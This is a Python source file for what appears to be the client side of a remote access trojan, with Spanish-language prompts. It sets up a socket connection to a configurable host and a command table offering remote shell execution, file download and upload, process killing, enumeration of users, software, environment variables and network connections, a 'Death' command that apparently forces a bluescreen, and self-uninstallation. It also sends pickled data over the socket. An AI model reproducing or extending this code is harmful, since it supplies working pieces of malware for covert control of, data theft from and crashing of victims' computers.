import pickle
import socket
from . import functions as f
from client.setup import ClientSetup


class Client:
    def __init__(self, host=None, port=None,client_socket=None):
        self.host = host
        self.port = port
        self.setup = ClientSetup(__name__)

        # Define command arguments and corresponding prompts
        self.command_args = {
            "kill": ["pid", "Ingrese el PID del proceso a terminar: "],
            "files": ["path", "Ingrese la ruta a listar (Enter para actual): "],
            "shell": ["command", "Ingrese el comando a ejecutar: "],
            "download": ["remote_path", "Ingrese la ruta del archivo remoto: "],
            "upload": ["local_path", "Ingrese la ruta del archivo local: "],
        }

        # Define commands and their associated functions
        self.commands = {
            "hostname": f.get_hostname,
            "ip": f.get_ip,
            "os": f.get_os,
            "Death": f.bluescreen,
            "users": f.get_users,
            "processes": f.get_processes,
            "drives": f.get_drives,
            "files": f.get_files,
            "download": f.download_file,
            "upload": f.upload_file,
            "network": f.get_network,
            "services": f.get_services,
            "kill": f.kill_process,
            "shell": f.execute_shell,
            "system_info": f.get_system_info,
            "environment": f.get_environment,
            "installed_software": f.get_installed_software,
            "network_connections": f.get_network_connections,
            "Uninstall tool": self.setup.uninstall,
        }

        self.client_socket = None
        self.status_message = ""
        self.colors = {}

    def send_command(self, command):
        """Sends the command result back to the server."""
        try:
            self.client_socket.sendall(command.encode('utf-8'))
            Result = self.client_socket.recv(4096).decode('utf-8')
            return Result
        except Exception as e:
            self.status_message = f"[!] Error sending result to server: {e}"
            return None

    def connect(self):
        """Connects to the server."""
        try:
            self.client_socket = socket.create_connection((self.host, self.port))
            self.client_socket.sendall(pickle.dumps({"status": "connected"}))  # Test message
            self.status_message = "[+] Connected to the server."
            return True
        except Exception as e:
            self.status_message = f"[!] Error connecting to the server: {e}"
            return False

    def close(self):
        """Closes the client's connection."""
        if self.client_socket:
            self.client_socket.close()
            self.client_socket = None
            self.status_message = "[-] Connection closed."


